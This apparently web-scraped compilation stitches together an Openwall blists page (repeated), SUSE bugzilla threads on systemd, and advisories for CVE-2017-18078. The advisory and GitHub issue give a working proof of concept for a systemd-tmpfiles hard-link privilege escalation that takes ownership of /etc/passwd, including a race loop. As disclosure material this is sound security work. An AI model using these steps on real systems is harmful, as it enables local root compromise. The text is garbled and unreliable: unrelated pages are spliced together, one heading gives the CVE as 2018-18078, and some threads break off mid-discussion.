# blists - web interface to mailing list archives

blists is a web interface to mailing list archives that works off indexed mbox files.
There are two programs: *bindex* and *bit*.
*bindex* generates or updates the index file (yes, incremental updates are supported).
*bit* is a CGI/SSI program that generates web pages on the fly.
Both programs are written in C and are very fast.

You can view the latest <README> file,
which describes blists in more detail and provides installation instructions.
It is also included in the archive below.

Download ([release notes](/lists/announce/2017/11/19/1)):

* [blists 2.0](blists-2.0.tar.gz) and
  its [signature](blists-2.0.tar.gz.sign)* [blists 1.0](blists-1.0.tar.gz) and
    its [signature](blists-1.0.tar.gz.sign)

These files are also
[available from the Openwall file archive](https://download.openwall.net/pub/projects/blists/).
The source code of blists can be browsed on
[GitHub](https://github.com/openwall/blists) or via
[CVSweb](https://cvsweb.openwall.com/blists).

Follow [this link](/signatures/) for information on verifying the signatures.

| [Description](show_bug.cgi?id=1057974#c0)  strahil nikolov   2017-09-10 14:44:17 UTC  ``` Description of problem: systemd's "--host" option never ends with options "enable" and "start", but "status" is OK. In order to get back to the shell - an interrupt is needed (Ctrl + C).  Version-Release number of selected component (if applicable): libsystemd0-228-35.1.x86_64 libsystemd0-32bit-228-35.1.x86_64 systemd-228-35.1.x86_64 systemd-32bit-228-35.1.x86_64   How reproducible: Always  Steps to Reproduce: 1.Exchange ssh keys (not necessary) 2.A.Run "systemctl start pacemaker.service -H hasuse2" /where hasuse2 is the remote host/ 2.B.Run "systemctl stop cups.service -H hasuse2" /where hasuse2 is the remote host/ 3.Interrupt to get back to the shell.   Actual results: The systemctl's "-H" and "--host=" never return to the shell with combination of "enable" and "start". The "status" is working fine.  Expected results: All options to manage successfully the remote host without any issues.  Additional info: "systemctl status pacemaker.service -H hasuse2" works without any issues. ``` [Comment 1](show_bug.cgi?id=1057974#c1)  strahil nikolov   2017-09-10 14:45:26 UTC  ``` Forgot to mention in the description that it also affects "stop". ``` [Comment 2](show_bug.cgi?id=1057974#c2)  Franck Bui   2018-01-12 09:02:47 UTC  ``` Hi,  Sorry for the delay...  Could you try to use "--no-pager" option and see if it helps ?  Thanks. ``` [Comment 3](show_bug.cgi?id=1057974#c3)  strahil nikolov   2018-01-12 12:02:04 UTC  ``` Created [attachment 755872](attachment.cgi?id=755872 "strace output with/without pager") [[details]](attachment.cgi?id=755872&action=edit "strace output with/without pager") strace output with/without pager  created with "strace -fvttTyy -s 256" options ``` [Comment 4](show_bug.cgi?id=1057974#c4)  strahil nikolov   2018-01-12 12:02:41 UTC  ``` Tested again with packages:  libsystemd0-228-38.1.x86_64 libsystemd0-32bit-228-38.1.x86_64 systemd-228-38.1.x86_64 systemd-32bit-228-38.1.x86_64  Behaviour with and without "--no-pager" is the same. ``` [Comment 5](show_bug.cgi?id=1057974#c5)  Franck Bui   2018-01-12 14:24:20 UTC  ``` And does "ssh -xT <host> -- systemctl start xxx" work ? ``` [Comment 6](show_bug.cgi?id=1057974#c6)  strahil nikolov   2018-01-12 14:45:44 UTC  ``` Seems to work :  drbd3-suse:~ # ssh -xT drbd4-suse "systemctl status cups.service" ● cups.service - CUPS Printing Service    Loaded: loaded (/usr/lib/systemd/system/cups.service; disabled; vendor preset: enabled)    Active: inactive (dead)  яну 12 13:17:51 drbd4-suse systemd[1]: Stopped CUPS Printing Service. яну 12 13:19:51 drbd4-suse systemd[1]: Started CUPS Printing Service. яну 12 13:20:27 drbd4-suse systemd[1]: Stopping CUPS Printing Service... яну 12 13:20:27 drbd4-suse systemd[1]: Stopped CUPS Printing Service. яну 12 13:21:32 drbd4-suse systemd[1]: Started CUPS Printing Service. яну 12 13:32:13 drbd4-suse systemd[1]: Stopping CUPS Printing Service... яну 12 13:32:13 drbd4-suse systemd[1]: Stopped CUPS Printing Service. яну 12 13:34:22 drbd4-suse systemd[1]: Started CUPS Printing Service. яну 12 13:39:00 drbd4-suse systemd[1]: Stopping CUPS Printing Service... яну 12 13:39:00 drbd4-suse systemd[1]: Stopped CUPS Printing Service. drbd3-suse:~ # ssh -xT drbd4-suse "systemctl start cups.service" drbd3-suse:~ # ssh -xT drbd4-suse "systemctl status cups.service" ● cups.service - CUPS Printing Service    Loaded: loaded (/usr/lib/systemd/system/cups.service; disabled; vendor preset: enabled)    Active: active (running) since пт 2018-01-12 16:44:52 EET; 1s ago  Main PID: 20276 (cupsd)     Tasks: 1 (limit: 512)    CGroup: /system.slice/cups.service            └─20276 /usr/sbin/cupsd -f  яну 12 16:44:52 drbd4-suse systemd[1]: Started CUPS Printing Service. ``` [Comment 7](show_bug.cgi?id=1057974#c7)  Franck Bui   2018-01-12 14:56:13 UTC  ``` (In reply to strahil nikolov from [comment #6](show_bug.cgi?id=1057974#c6)) > Seems to work : >  > drbd3-suse:~ # ssh -xT drbd4-suse "systemctl status cups.service"  Well according to your first comment, "status" is supposed to work with '-H' so it would have been more interesting to try with another command which is failing with '-H' ``` [Comment 8](show_bug.cgi?id=1057974#c8)  strahil nikolov   2018-01-12 14:59:23 UTC  ``` Using ssh in the following syntax also works:  ssh -xT drbd4-suse -- systemctl status cups.service ssh -xT drbd4-suse -- systemctl stop cups.service ssh -xT drbd4-suse -- systemctl status cups.service ``` [Comment 9](show_bug.cgi?id=1057974#c9)  strahil nikolov   2018-01-12 14:59:52 UTC  ``` So definately "start/stop" works this way... but not with the "-H" option. ``` [Comment 10](show_bug.cgi?id=1057974#c10)  Franck Bui   2018-01-12 15:02:52 UTC  ``` Any chance you can try '-H' with a more recent version of systemd ?  Perhaps by using Tumbleweed ? ``` [Comment 11](show_bug.cgi?id=1057974#c11)  strahil nikolov   2018-01-12 21:21:29 UTC  ``` I've did some testing with Tumbleweed (latest & greatest).  Packages used: libsystemd0-234-9.1.x86_64 systemd-234-9.1.x86_64  Here are the results:  Tumbleweed ---> Leap   - same issue (only status working) Tumbleweed ---> RHEL 7 - everything works Leap ---> Tumbleweed   - everything works Leap ---> RHEL 7       - everything works RHEL7 ---> Leap        - same issue (only status working) ``` [Comment 12](show_bug.cgi?id=1057974#c12)  Franck Bui   2018-01-15 16:07:29 UTC  ``` Thanks for the testing !  So apparently systemd-stdio-bridge v228 has a bug which has been fixed by later versions.  I'll try to find out which commit fixed that.  That said, I'm really not sure what the point of the '-H' switch since one can achieve the same with "ssh -xT <host> -- systemctl ..." (and also can pass more options to ssh which doesn't seem possible with '-H').  So I would suggest to use ssh anyway. ``` [Comment 13](show_bug.cgi?id=1057974#c13)  strahil nikolov   2018-01-15 17:15:02 UTC  ``` The "-H" option is suitable for manipulating containers on remote machines.Yes, ssh is an option , but if the option exists -> it either has to be working or removed. ``` [Comment 14](show_bug.cgi?id=1057974#c14)  Franck Bui   2018-01-15 17:20:41 UTC  ``` (In reply to strahil nikolov from [comment #13](show_bug.cgi?id=1057974#c13)) > The "-H" option is suitable for manipulating containers on remote > machines.  "ssh -xT <host> -- systemctl -M xxx ..." should achieve the same.  > Yes, ssh is an option , but if the option exists -> it either has > to be working or removed.  Sure I was just suggesting you to use ssh while we're looking into this. ``` [Comment 15](show_bug.cgi?id=1057974#c15)  Franck Bui   2018-01-31 12:36:14 UTC  ``` So FTR: the issue has been introduced by the following commit:    commit e23bc0e7cac8ba79f4e14ab98ecd68c79cc87aab   Author: David Herrmann <dh.herrmann@gmail.com>   Date:   Thu Jul 16 15:14:43 2015 +0200        bus-proxy: never pass on unmatched broadcasts  because it had the bad side effect to make the proxy filtered "JobRemoved" signal out and systemctl waits for it in order to detect that the start/stop commands has been proceed.  The thing is that the code has been drastically changed since v228: bus-proxyd and all related stuff have been dropped, only systemd-stdio-bridge survived (though I still don't see the usefulness of it) and has been totally rewritten so it won't rely on the old proxy code anymore.  I think we could backport those changes in v228 as bus-proxyd is dead code and thus make systemd-stdio-bridge identical to the one shipped by v234. ``` [Comment 17](show_bug.cgi?id=1057974#c17)  Franck Bui   2018-02-14 15:02:59 UTC  ``` Fix submitted, closing. ``` [Comment 19](show_bug.cgi?id=1057974#c19)  Swamp Workflow Management   2018-02-26 20:07:55 UTC  ``` SUSE-SU-2018:0546-1: An update that solves one vulnerability and has 5 fixes is now available.

| [Description](show_bug.cgi?id=1071224#c0)  Ludwig Nussel   2017-12-05 09:00:48 UTC  ``` systemd's %post script removes /usr/lib/systemd/system/tmp.mount. That breaks rpm -V systemd, therefore delta rpms for systemd. Don't do that. If you don't want the file don't ship it. To mask it use systemctl mask. ``` [Comment 1](show_bug.cgi?id=1071224#c1)  Ludwig Nussel   2017-12-05 09:01:09 UTC  ``` Affects 42 and 14 too ``` [Comment 2](show_bug.cgi?id=1071224#c2)  Ludwig Nussel   2017-12-05 09:01:59 UTC  ``` s/14/15 ``` [Comment 3](show_bug.cgi?id=1071224#c3)  Franck Bui   2017-12-07 14:04:57 UTC  ``` The problem with "stop shipping it" is that it would break any users who choose to use this unit file.  And masking the unit wouldn't help either since we don't want to mask tmp.mount if it's been generated from /etc/fstab or the user created his own version of the file. ``` [Comment 4](show_bug.cgi?id=1071224#c4)  Ludwig Nussel   2017-12-07 14:14:54 UTC  ``` in any case you cannot just rm it, it's part of the package ``` [Comment 5](show_bug.cgi?id=1071224#c5)  Franck Bui   2017-12-07 14:18:16 UTC  ``` You're right, however I'm not sure how we could fix this properly... ``` [Comment 6](show_bug.cgi?id=1071224#c6)  Ludwig Nussel   2017-12-07 14:24:48 UTC  ``` Just don't do it. 15 will be a new major release, we document the change in behavior and be done with it. ``` [Comment 7](show_bug.cgi?id=1071224#c7)  Ludwig Nussel   2017-12-07 14:29:42 UTC  ``` Note that by default we have a btrfs subvolume for /tmp that is mounted via fstab, so according to <https://www.freedesktop.org/wiki/Software/systemd/APIFileSystems/> this takes preference ie no change in behavior for a default install on btrfs actually. ``` [Comment 8](show_bug.cgi?id=1071224#c8)  Franck Bui   2017-12-07 14:30:21 UTC  ``` Just to make sure: you meant to stop shipping it and break any users that would rely on it ? ``` [Comment 9](show_bug.cgi?id=1071224#c9)  Franck Bui   2017-12-07 14:33:09 UTC  ``` (In reply to Ludwig Nussel from [comment #7](show_bug.cgi?id=1071224#c7)) > Note that by default we have a btrfs subvolume for /tmp that is mounted via > fstab, so according to > <https://www.freedesktop.org/wiki/Software/systemd/APIFileSystems/> this takes > preference ie no change in behavior for a default install on btrfs actually.  Correct but if a customer selected ext4 I'm not sure that /tmp is referenced in fstab. ``` [Comment 10](show_bug.cgi?id=1071224#c10)  Ludwig Nussel   2017-12-07 14:47:01 UTC  ``` (In reply to Franck Bui from [comment #8](show_bug.cgi?id=1071224#c8)) > Just to make sure: you meant to stop shipping it and break any users that > would rely on it ?  For this case you could still copy a backup of it to /etc in %pre of the new package. ``` [Comment 11](show_bug.cgi?id=1071224#c11)  Ludwig Nussel   2017-12-07 14:51:45 UTC  ``` another option would be to move the file to a subpackage.  Did we ever ship the file installed anyways? ``` [Comment 12](show_bug.cgi?id=1071224#c12)  Franck Bui   2017-12-07 15:03:59 UTC  ``` How about this:    1. check that tmp.mount is active: if so we can assume that either tmp.mount from fstab is used or customer has its own version in /etc/systemd/...       In these cases we can safely ship the default tmp.mount in /usr/lib/systemd/system since the active version will take precedence.   2. if tmp.mount is not active: we still ship tmp.mount but we mask it  WDYT ? ``` [Comment 13](show_bug.cgi?id=1071224#c13)  Franck Bui   2017-12-08 07:54:40 UTC  ``` Answering to myself: that can't work during installation.  How about letting the installer sorting this out in this case ?  IOW it could mask tmp.mount unless it writes an entry in fstab for /tmp. ``` [Comment 14](show_bug.cgi?id=1071224#c14)  Ludwig Nussel   2017-12-08 15:04:09 UTC  ``` The installer might work but then how about just removing the requirement on tmp.mount from basic.target? That should also prevent it from starting automatically, right? ``` [Comment 15](show_bug.cgi?id=1071224#c15)  Franck Bui   2017-12-08 15:52:50 UTC  ``` But that would also break all users who are using it. ``` [Comment 16](show_bug.cgi?id=1071224#c16)  Ludwig Nussel   2017-12-14 15:03:52 UTC  ``` another variant: tmp.mount could be removed from basic.target but an install section could be added:  [Install] WantedBy=basic.target  That means one would have to explicitly run systemctl enable to get tmp.mount ``` [Comment 17](show_bug.cgi?id=1071224#c17)  Ludwig Nussel   2017-12-14 15:04:56 UTC  ``` hmm, wonder how that plays with tmp.mount from fstab ``` [Comment 18](show_bug.cgi?id=1071224#c18)  Franck Bui   2017-12-20 10:19:35 UTC  ``` Sorry for the delay...  Letting tmp.mount still accessible is pretty dangerous (even if basic.target won't pull it in) because there are several other ways to activate it implicitly: for example when a unit is using private /tmp.  So the only safe way I can see would be to mask the unit by default during the installation if no entry for /tmp is created in fstab by the installer.  Regarding the upgrade path, we could mask tmp.mount if no tmp.mount is currently active and restore /usr/lib/systemd/system/tmp.mount if not present. Otherwise if a tmp.mount unit is active, simply restoring the one shipped by udev should be enough. ``` [Comment 19](show_bug.cgi?id=1071224#c19)  Thorsten Kukuk   2018-01-19 11:58:30 UTC  ``` (In reply to Franck Bui from [comment #18](show_bug.cgi?id=1071224#c18))  > So the only safe way I can see would be to mask the unit by default during > the installation if no entry for /tmp is created in fstab by the installer.  We have many installation ways and methods, and also upgrade has to work. So, a solution based on special code in the installer violates with the requirement and goal, to have an universal usable installer. And it does not fix the problem for images (like build with kiwi), updates, rpm, SUSE Manager, and a lot of other cases I'm pretty sure I forgot to mention.  The only good, reliable solution is one, which works if you install with rpm -ihv into a chroot environment: the it will always work.  In my opinion, we should not ship tmp.mount in the default path, but as 'example' or documentation in /usr/share/doc/packages/systemd or so. Yes, there is the risk to break very few installations, but I really doubt that people outside there use it, since we remove it if not activated. So how should an user ever activate it, if it is already removed at that point in time? And if a user want's it, he can link the example to /etc/systemd/... or copy it. ``` [Comment 20](show_bug.cgi?id=1071224#c20)  Franck Bui   2018-01-19 14:37:30 UTC  ``` (In reply to Thorsten Kukuk from [comment #19](show_bug.cgi?id=1071224#c19)) > (In reply to Franck Bui from [comment #18](show_bug.cgi?id=1071224#c18)) >  > > So the only safe way I can see would be to mask the unit by default during > > the installation if no entry for /tmp is created in fstab by the installer. >  > We have many installation ways and methods, and also upgrade has to work.

That's what we're doing except that we care about users that already set up tmpfs on /tmp.  > Yes, there is the risk to break very few installations, but I really doubt > that people outside there use it, since we remove it if not activated.

Actually I'm using tmpfs on /tmp.  And even if that would be true, breaking (voluntarily) user systems is a bad choice. ``` [Comment 21](show_bug.cgi?id=1071224#c21)  Thorsten Kukuk   2018-01-19 14:46:15 UTC  ``` (In reply to Franck Bui from [comment #20](show_bug.cgi?id=1071224#c20)) > (In reply to Thorsten Kukuk from [comment #19](show_bug.cgi?id=1071224#c19)) > > (In reply to Franck Bui from [comment #18](show_bug.cgi?id=1071224#c18)) > >  > > > So the only safe way I can see would be to mask the unit by default during > > > the installation if no entry for /tmp is created in fstab by the installer. > >  > > We have many installation ways and methods, and also upgrade has to work. >  > Updates of systemd package would take care of this.

Actually I'm using tmpfs on /tmp.  But only either because you enabled it with a broken systemd package or by copying the file to /usr/lib/systemd/system/..., which was wrong, because you should have copied to /etc/systemd/... If you install systemd, the tmp.mount is immediately deleted during the install process, so as normal openSUSE or SLE user, you cannot enable it because it is already deleted. If you copy it correctly to /etc/systemd/... yourself, the removal of the file from systemd package will not break your system.   > And even if that would be true, breaking (voluntarily) user systems is a bad > choice.  The systems are not broken, you only don't use tmpfs anymore for /tmp.  But it's still better that a few customers suffer than all customers by not beeing able to update systemd via delta-RPMs and by having warnings in their monitoring tools since rpm -Va reports missing files. ``` [Comment 22](show_bug.cgi?id=1071224#c22)  Franck Bui   2018-01-25 11:35:39 UTC  ``` Ok so how about doing this:  --- %< ---  $ cat /etc/systemd/system/systemd-disable-tmpfs-for-tmp.service  # By default, /tmp doesn't use tmpfs on SUSE distros. # # This script is either run automatically during the firstboot (i.e. # only once) of the system. # # Or the service can also be (manually) started during systemd update # (%post) only and only if tmp.mount wasn't installed in /usr/lib # during %pre. In this case tmp.mount should also masked.  [Unit] Description=Mask tmp.mount by default on SUSE systems DefaultDependencies=no Conflicts=shutdown.target After=systemd-remount-fs.service Before=tmp.mount ConditionPathIsReadWrite=/etc ConditionPathExists=!/usr/lib/systemd/scripts/.disable-tmp-mount-by-default.sh~done  [Service] Type=oneshot RemainAfterExit=yes ExecStart=/bin/sh -c '						\ 	case "$(systemctl show -pFragmentPath tmp.mount)" in	\ 	FragmentPath=/usr/lib/systemd/system/tmp.mount)		\ 		systemctl mask --now tmp.mount ;;		\ 	esac'  ExecStartPost=/usr/bin/touch /usr/lib/systemd/scripts/.disable-tmp-mount-by-default.sh~done  --- %< ---  this service should be statically pulled in by sysinit.target.  And in systemd.spec:  %pre if test -e /usr/lib/systemd/system/tmp.mount; then     # If tmp.mount is there it means that admin restored it and     # wants to use tmpfs.

Ludwig, would that fill the gap ? ``` [Comment 23](show_bug.cgi?id=1071224#c23)  Ludwig Nussel   2018-01-25 16:54:58 UTC  ``` I am still not convinced about any complex solution.

Fair enough.  But the previous solution is supposed to handle gracefully all the corner cases that we can encounter out there though.  Also it would ease the switch to "tmpfs for /tmp" the day SUSE will decide to make it the default since we would simply have to stop shipping the new service that figures out if tmp.mount needs to be masked during the first boot.  But if we're fine to forget those corner cases then shipping tmp.mount as a template (like we did already) only and recommending to symlink it from /etc if one wants to use tmpfs seems the simplest indeed. ``` [Comment 25](show_bug.cgi?id=1071224#c25)  Franck Bui   2018-01-29 08:02:54 UTC  ``` After thinking more about it, I'll go for the solution posted in [comment #22](show_bug.cgi?id=1071224#c22).  I think it's better because:   1. it's supposed to support all cases   2. masking tmp.mount is the official and documented way to disable tmpfs on /tmp   3. it will be easier and cleaner to switch the defaults to tmpfs in the future.  I'll make the changes reach Factory first and see how it goes. ``` [Comment 26](show_bug.cgi?id=1071224#c26)  Franck Bui   2018-02-02 08:48:02 UTC  ``` Ludwig, I guess this also needs to be fixed in SLE12-SP2+, right ? ``` [Comment 27](show_bug.cgi?id=1071224#c27)  Richard Brown   2018-02-08 09:38:22 UTC  ``` (In reply to Franck Bui from [comment #26](show_bug.cgi?id=1071224#c26)) > Ludwig, I guess this also needs to be fixed in SLE12-SP2+, right ?

The only time you can write to the rootfs on Kubic and CaaSP is during a package installation/upgrade - the rootfs is immutable, but the package changes are written to a new snapshot which will take effect on next boot  So the only place you COULD implement this logic is in the %post  I think you should not, I think this is an overly complex solution for little or no benefit.

I'm fine to use the other solution but the main issue will remain and will need to be fixed the same way the day when SUSE will decide to make tmpfs the default for /tmp: everyone who don't use tmpfs will need to keep this setting once the default will be changed and the only solution I can see currently is to mask tmp.mount only *once*.

Subject: CVE-2018-18078: systemd-tmpfiles root privilege escalation with
 fs.protected_hardlinks=0

Product: systemd (systemd-tmpfiles)
Versions-affected: 236 and earlier
Author: Michael Orlitzky
Fixed-in: commit 5579f85 , version 237
Bug-report: <https://github.com/systemd/systemd/issues/7736>
Acknowledgments: Lennart Poettering who, instead of calling me an idiot
  for not realizing that systemd enables fs.protected_hardlinks by
  default, went out of his way to harden the non-default configuration.

== Summary ==

Before version 237, the systemd-tmpfiles program will change the
permissions and ownership of hard links. If the administrator disables
the fs.protected_hardlinks sysctl, then an attacker can create hard
links to sensitive files and subvert systemd-tmpfiles, particularly
with "Z" type entries.

Systemd as PID 1 with the default fs.protected_hardlinks=1 is safe.

== Details ==

When running as PID 1, systemd enables the fs.protected_hardlinks
sysctl by default; that prevents an attacker from creating hard links
to files that he can't write to. If, however, the administrator should
decide to disable that sysctl, then hard links may be created to any
file (on the same filesystem).

Before version 237, the systemd-tmpfiles program will voluntarily
change the permissions and ownership of a hard link, and that is
exploitable in a few scenarios. The most problematic and easiest to
exploit is the "Z" type tmpfiles.d entry, which changes ownership and
permissions recursively. For an example, consider the following
tmpfiles.d entries,

  d /var/lib/systemd-exploit-recursive 0755 mjo mjo
  Z /var/lib/systemd-exploit-recursive 0755 mjo mjo

Whenever systemd-tmpfiles is run, those entries make mjo the owner of
everything under and including /var/lib/systemd-exploit-recursive. After
the first run, mjo can create a hard link inside that directory pointing
to /etc/passwd. The next run (after a reboot, for example) changes the
ownership of /etc/passwd.

A proof-of-concept can be run from the systemd source tree, using
either two separate terminals or sudo:

  root # sysctl -w fs.protected_hardlinks=0
  root # sysctl -w kernel.grsecurity.linking_restrictions=0
  root # ./build/systemd-tmpfiles --create
  mjo $ ln /etc/passwd /var/lib/systemd-exploit-recursive/x
  root # ./build/systemd-tmpfiles --create
  mjo $ /bin/ls -l /etc/passwd
  -rwxr-xr-x 2 mjo mjo 1504 Dec 20 14:27 /etc/passwd

More elaborate exploits are possible, and not only the "Z" type is
vulnerable.

== Resolution ==

The recursive change of ownership/permissions does not seem to be safely
doable without fs.protected_hardlinks enabled.

In version 237 and later, systemd-tmpfiles calls fstatat() immediately
after obtaining a file descriptor from open():

  fd = open(path, O_NOFOLLOW|O_CLOEXEC|O_PATH);
  if (fd < 0) {
    ...
  }
  if (fstatat(fd, "", &st, AT_EMPTY_PATH) < 0)

The st->st_nlink field is then checked to determine whether or not fd
describes a hard link. If it does, the ownership/permissions are not
changed, and an error is displayed:

  if (hardlink_vulnerable(&st)) {
    log_error("Refusing to set permissions on hardlink...", path);
    return -EPERM;
  }

There is still a tiny window between open() and fstatat() where the
attacker can fool this countermeasure by removing an existing hard
link to, say, /etc/passwd. In that case, st->st_nlink will be 1, but
fd still references /etc/passwd. The attack succeeds, but is much
harder to do, and the window is as narrow as possible. More to the
point, it seems unavoidable when implementing the tmpfiles.d
specification.

== Mitigation ==

Leave the fs.protected_hardlinks sysctl enabled.

# blists - web interface to mailing list archives

blists is a web interface to mailing list archives that works off indexed mbox files.
There are two programs: *bindex* and *bit*.
*bindex* generates or updates the index file (yes, incremental updates are supported).
*bit* is a CGI/SSI program that generates web pages on the fly.
Both programs are written in C and are very fast.

You can view the latest <README> file,
which describes blists in more detail and provides installation instructions.
It is also included in the archive below.

Download ([release notes](/lists/announce/2017/11/19/1)):

* [blists 2.0](blists-2.0.tar.gz) and
  its [signature](blists-2.0.tar.gz.sign)* [blists 1.0](blists-1.0.tar.gz) and
    its [signature](blists-1.0.tar.gz.sign)

These files are also
[available from the Openwall file archive](https://download.openwall.net/pub/projects/blists/).
The source code of blists can be browsed on
[GitHub](https://github.com/openwall/blists) or via

Subject: Re: CVE-2017-18078: systemd-tmpfiles root privilege

## Description

[![@orlitzky](https://avatars.githubusercontent.com/u/1432135?v=4&size=48)](/orlitzky)[orlitzky](https://github.com/orlitzky)opened [on Dec 24, 2017](https://github.com/systemd/systemd/issues/7736#issue-284374417)

```
$ sudo sysctl -w fs.protected_hardlinks=0
$ sudo sysctl -w kernel.grsecurity.linking_restrictions=0

```

The tmpfiles.d specification for the `Z` type more or less implies some kind of recursive chown. The spec heads off one type of vulnerability by saying that symlinks should not be followed; however, hard links are still a problem. Consider the following:

```
$ cat /etc/tmpfiles.d/exploit-recursive.conf
d /var/lib/systemd-exploit-recursive 0755 mjo mjo
Z /var/lib/systemd-exploit-recursive 0755 mjo mjo

```

The first time that tmpfiles is run, everything is fine. But then my "mjo" user owns the directory in question, and I can create a hard link...

```
$ ln /etc/passwd /var/lib/systemd-exploit-recursive/x

```

and re-run tmpfiles...

```
$ sudo ./build/systemd-tmpfiles --create

```

to take ownership of `/etc/passwd`:

```
$ /bin/ls -l /etc/passwd
-rwxr-xr-x 2 mjo mjo 1504 Dec 20 14:27 /etc/passwd

```

Now, I said that everything was fine the first time that tmpfiles was run, but I lied. The recursive chown moves from the top down, meaning that `systemd-exploit-recursive/x` is chowned after `systemd-exploit-recursive`. There is a race condition there that can be exploited. In another terminal, you can run,

```
while true; do ln /etc/passwd /var/lib/systemd-exploit-recursive/x; done;
```

and if you're lucky, the hard link will get created after you own the `systemd-exploit-recursive` directory, but before chown is called on `x`. This particular race condition isn't unique to the `Z` type. For another example, consider,

```
$ cat /etc/tmpfiles.d/exploit-race.conf
d /var/lib/systemd-exploit-race 0755 mjo mjo
f /var/lib/systemd-exploit-race/foo 0644 mjo mjo

```

Here, the same thing happens, and the "mjo" user has some time to replace `foo` with a hard link.

| [Description](show_bug.cgi?id=1071311#c0)  Markos Chandras   2017-12-05 14:47:00 UTC  ``` Hello,  networkd is enabled the systemd package in Tumbleweed but it's explicitly disabled in all the Leap ones. Would it be possible to provide networkd either as part of the systemd package or as a separate subpackage? We would like to use it in some upstream OpenStack projects. Thank you ``` [Comment 1](show_bug.cgi?id=1071311#c1)  Franck Bui   2017-12-05 14:51:34 UTC  ``` Hi Markos,  Since Ludwig is fine with this, I'll do this change and both 42.2 and 42.3 will ship networkd. However networkd will be still disabled by default.  Cheers. ``` [Comment 2](show_bug.cgi?id=1071311#c2)  Andreas Stieger   2017-12-05 20:03:51 UTC  ``` Maintenance is not fine with this for Leap 42.2/42.3. ``` [Comment 3](show_bug.cgi?id=1071311#c3)  Markos Chandras   2017-12-08 11:28:07 UTC  ``` (In reply to Andreas Stieger from [comment #2](show_bug.cgi?id=1071311#c2)) > Maintenance is not fine with this for Leap 42.2/42.3.  Hi Andreas,  Could you explain why maintenance is not happy with it? Do you also oppose to a separate systemd-networkd subpackage which is not pulled in by default by the systemd one? ``` [Comment 4](show_bug.cgi?id=1071311#c4)  Andreas Stieger   2017-12-08 12:40:59 UTC  ``` (In reply to Markos Chandras from [comment #3](show_bug.cgi?id=1071311#c3)) > Could you explain why maintenance is not happy with it?  That is openSUSE Maintenance I might add, and I may just be the standard stance based on the information given.  Basically I am concerned about the introduction of this into Leap 42.x without proper integrating this with the other network management things. Overall I think such a change may be better suited for Leap 15, which is what Ludwig may have meant. I mean, there was probably a reason why this was not shipped in SLE 12 and Leap?  Do you intend to fork the Leap 42.x package from SLE for this? Do you intend to bring through SLE maintenance?  > Do you also oppose to a separate systemd-networkd subpackage > which is not pulled in by default by the systemd one?  Not much different here, it would be off either way unless systemd magically starts such things. Would not make much sense though to introduce a new package to then merge it again in TW and 15. ``` [Comment 5](show_bug.cgi?id=1071311#c5)  Andreas Stieger   2018-02-07 10:21:28 UTC  ``` You can make a change to SUSE:SLE-12-SP2:Update/system that enables building of systemd-networkd. Whether you make this a conditional or a subpackage that is shipped in Leap but not SLE I will leave to you. Once this update is imported into Leap maintenance, systemd-networkd will be available in Leap, with the understanding that it remains off by default. ``` [Comment 6](show_bug.cgi?id=1071311#c6)  Franck Bui   2018-02-09 07:44:19 UTC  ``` networkd has been enabled on Leap distros eventually, see: [https://build.suse.de/package/rdiff/home:fbui:systemd:SLE-12-SP2/systemd?linkrev=base&rev=214](https://build.suse.de/package/rdiff/home%3Afbui%3Asystemd%3ASLE-12-SP2/systemd?linkrev=base&rev=214)  So it should be part of the next update of systemd.  Closing. ``` [Comment 9](show_bug.cgi?id=1071311#c9)  Swamp Workflow Management   2018-02-26 20:08:28 UTC  ``` SUSE-SU-2018:0546-1: An update that solves one vulnerability and has 5 fixes is now available.

openSUSE Security Update: Security update for systemd
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
Announcement ID: openSUSE-SU-2018:0560-1
Rating: moderate
References: #1057974 #1068588 #1071224 #1071311 #1075801
#1077925
Cross-References: CVE-2017-18078
Affected Products:
openSUSE Leap 42.3
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
An update that solves one vulnerability and has 5 fixes is
now available.
Description:
This update for systemd fixes the following issues:
Security issue fixed:
- CVE-2017-18078: tmpfiles: refuse to chown()/chmod() files which are
hardlinked, unless protected\_hardlinks sysctl is on. This could be used
by local attackers to gain privileges (bsc#1077925)
Non Security issues fixed:
- core: use id unit when retrieving unit file state (#8038) (bsc#1075801)
- cryptsetup-generator: run cryptsetup service before swap unit (#5480)
- udev-rules: all values can contain escaped double quotes now (#6890)
- strv: fix buffer size calculation in strv\_join\_quoted()
- tmpfiles: change ownership of symlinks too
- stdio-bridge: Correctly propagate error
- stdio-bridge: remove dead code
- remove bus-proxyd (bsc#1057974)
- core/timer: Prevent timer looping when unit cannot start (bsc#1068588)
- Make systemd-timesyncd use the openSUSE NTP servers by default
Previously systemd-timesyncd used the Google Public NTP servers
time{1..4}.google.com
- Don't ship /usr/lib/systemd/system/tmp.mnt at all (bsc#1071224) But we
still ship a copy in /var. Users who want to use tmpfs on /tmp are
supposed to add a symlink in /etc/ pointing to the copy shipped in /var.
To support the update path we automatically create the symlink if
tmp.mount in use is located in /usr.
- Enable systemd-networkd on Leap distros only (bsc#1071311)
This update was imported from the SUSE:SLE-12-SP2:Update update project.
Patch Instructions:
To install this openSUSE Security Update use YaST online\_update.
Alternatively you can run the command listed for your product:
- openSUSE Leap 42.3:
zypper in -t patch openSUSE-2018-216=1
To bring your system up-to-date, use "zypper patch".

Version        : 215-17+deb8u12
CVE ID         : CVE-2017-18078 CVE-2019-3842

Two vulnerabilities have been addressed in the systemd components
systemd-tmpfiles and pam_systemd.so.

CVE-2017-18078

    systemd-tmpfiles in systemd attempted to support ownership/permission
    changes on hardlinked files even if the fs.protected_hardlinks sysctl
    is turned off, which allowed local users to bypass intended access
    restrictions via vectors involving a hard link to a file for which
    the user lacked write access.

CVE-2019-3842

    It was discovered that pam_systemd did not properly sanitize the
    environment before using the XDG_SEAT variable. It was possible for
    an attacker, in some particular configurations, to set a XDG_SEAT
    environment variable which allowed for commands to be checked against
    polkit policies using the "allow_active" element rather than
    "allow_any".

For Debian 8 "Jessie", these problems have been fixed in version
215-17+deb8u12.

We recommend that you upgrade your systemd packages.

